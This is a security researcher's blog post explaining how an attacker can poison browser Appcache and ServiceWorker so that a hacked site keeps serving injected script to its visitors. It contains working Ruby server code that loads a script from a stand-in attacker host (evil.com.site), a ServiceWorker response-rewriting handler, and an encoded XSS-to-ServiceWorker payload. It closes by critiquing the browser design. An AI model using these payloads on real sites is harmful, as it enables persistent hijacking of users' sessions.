---
layout: post
title:  "Using Appcache and ServiceWorker for Evil"
author: "Egor Homakov (<a href='https://twitter.com/homakov'>@homakov</a>)"
---

You're a bad guy and you just hacked a website. Normally you leak the database and leave. The owner fixes everything next day and removes your backdoor. With Middlekit techniques you can poison browser cache of every visitor and get more money and intelligence in a long run. 

They call it "Advanced Persistent Threat" in the cyber snake oil industry. It silently sits in the victim's user agent and waits for your commands. It can alter responses, proxy requests through your server etc - it is permanent session hijacking and XSS.

<img src="/img/mk.png">

I am not going to give you specific software, but will explain two approaches: appcache and serviceworker.

## <a href="https://www.html5rocks.com/en/tutorials/appcache/beginner/">Appcache</a> 

It works <a href="https://caniuse.com/#search=appcache">in all browsers</a>. You just need to add manifest itself in the CACHE MANIFEST section and <strong>the browser will always return poisoned documents from the cache</strong>. 

* You need to collect as many URLs as possible - you need to list them explicitly to make the user agent cache it. site:victim.com in google is a good start

{%highlight ruby%}
require 'open-uri'
f=open('https://www.google.ru/search?q=site%3Asakurity.com&oq=site%3Asakurity.com&aqs=chrome..69i57j69i58.2444j0j9&sourceid=chrome&es_sm=91&ie=UTF-8').read

def get_pages(domain)
  f=open('https://www.google.ru/search?q=site%3A'+domain+'&oq=site%3Asakurity.com&aqs=chrome..69i57j69i58.2444j0j9&sourceid=chrome&es_sm=91&ie=UTF-8&start=10&num=100&').read
  r = f.scan /http:\/\/#{domain}(.*?)[&%]/im
  puts r.flatten.uniq.join(' ')
end
get_pages 'sakurity.com'
{%endhighlight%}

* Don't forget user specific URLs such as "/settings" or "/homakov/direct_messages". You can generate the manifest on the fly.

* Insert your middlekit in front of the hacked production server. For demonstration you can run following script locally and add `127.0.0.1 sakurity.com` to your `/etc/hosts`. <strong>It also works in MitM attacks over wifi against https:// websites.</strong>

{%highlight ruby%}
require 'sinatra'

wire = lambda do
  if params[:utm_medium]
    r=  "real content"
  else
    r=<<HTML
<html manifest='/a.appcache'>
<script src="https://evil.com.site/middlekit.js"></script>
<script>
function load(url){
x=new XMLHttpRequest;
x.open('get',url);

x.setRequestHeader('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
x.setRequestHeader('Cache-Control','max-age=0');
x.setRequestHeader('Upgrade-Insecure-Requests','1');
x.send();

x.onreadystatechange=function(){
  if(x.readyState==4){
    document.write(x.responseText);
    //document.body.parentElement.innerHTML = x.responseText;
  }
}
}
if(location.href.indexOf("?") != -1){

  var u = location.href + "&utm_medium=1";
}else{
  var u = location.href + "?utm_medium=1";
}
//history.pushState("","",url);
console.log("Infected")
load(u);
</script>
</html>
HTML
  end
  r
end

pages = %w{/ /reconnect /lengthextension /logindemo /peatio.pdf /stealtitle /blog/2015/03/15/authy_bypass.html /blog/2015/03/03/duo_format_injection.html /blog/2015/07/28/appcache.html /blog/2015/03/10/Profilejacking.html /blog/2015/06/04/mongo_ruby_regexp.html /blog/2015/05/08/pusher.html /blog/2015/03/04/hybrid_api_auth.html /blog/2015/03/27/slack_or_reset_token_hashing.html /blog/2015/07/18/2fa.html /blog/2015/05/21/starbucks.html /blog/2015/03/05/RECONNECT.html /blog/2014/01/01/puzzle1.html /blog/2015/04/10/email_password_manager.html /blog/2015/02/28/openuri.html /blog/2015/06/25/puzzle2.html /blog/2015/01/22/peatio-audit.html /blog/2015/01/10/hacking-bitcoin-exchanger.html /triple}
pages.each{|page|
  get page, &wire
}

get '/a.appcache' do
  response.headers['cache-control'] = 'max-age=3155760000'
  response.headers['content-type'] = 'text/cache-manifest; charset=UTF-8'
"CACHE MANIFEST
/a.appcache
#{pages.join("\n")}
"
end
{%endhighlight%}

* Get as many users as possible to visit the hacked server right now - try a newsletter. 

* Now all of them load your middlekit.html first, and there is no way to destroy appcache with javascript. The admins have to ask every user to visit chrome://appcache-internals/ manually

## <a href="https://www.html5rocks.com/en/tutorials/service-worker/introduction/">ServiceWorker</a>

This one works only in Chrome on desktop and only over https: websites, but is actually much more dangerous. It creates a worker which alters responses for all requests and there's no need to explicitly cache every page - you can cover entire domain with one worker.

{%highlight ruby%}
onfetch=function(e){
  e.respondWith(new Response('<script>alert(document.domain)</script>',{headers: {'Content-Type':'text/html'}}))
}
{%endhighlight%}

To install a ServiceWorker the browser wants to see it as a response with `content-type:text/javascript`. Pinky, are you pondering what I'm pondering? 

Lots of JSONP endpoints respond with arbitrary JS. For instance <a href="https://gist.github.com/homakov/0ff5711729a14fb50b3f">look at my challenge</a>, this is <a href="https://clientsit.herokuapp.com/xss?user=%3Cscript%3E%0Anavigator.serviceWorker.register(%22%2Fjsonp%3Fcallback%3Donfetch%253Dfunction(e)%257B%250Ae.respondWith(new%2520Response(%27%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E%27%252C%257Bheaders%253A%2520%257B%27Content-Type%27%253A%27text%252Fhtml%27%257D%257D))%250A%257D%252F%252F%22).then(function(registration)%20%7B%0A%20%20console.log(%27ServiceWorker%20registration%20successful%20with%20scope%3A%20%27%2C%20%20%20%20registration.scope)%3B%0A%7D).catch(function(err)%20%7B%0A%20%20console.log(%27ServiceWorker%20registration%20failed%3A%20%27%2C%20err)%3B%0A%7D)%3B%0A%3C%2Fscript%3E">the answer</a>.

In other words <strong>XSS + JSONP + ServiceWorker = Permanent XSS on every page</strong>

## Recap

Appcache is too late to fix, and it's going to be perfect cache poisoning tool for a long while for both hacked websites and insecure connections (yet another reason to avoid https:// when you're on someone's wifi).

ServiceWorker is very young and powerful technology, and should be implemented more carefully, taking into account how common JSONP endpoints are. I believe it was a bad idea to allow any text/javascript responses to become a ServiceWorker. At least it should be an extra header `Service-Worker:true` or explicit `Content-Type:text/javascript-serviceworker`.


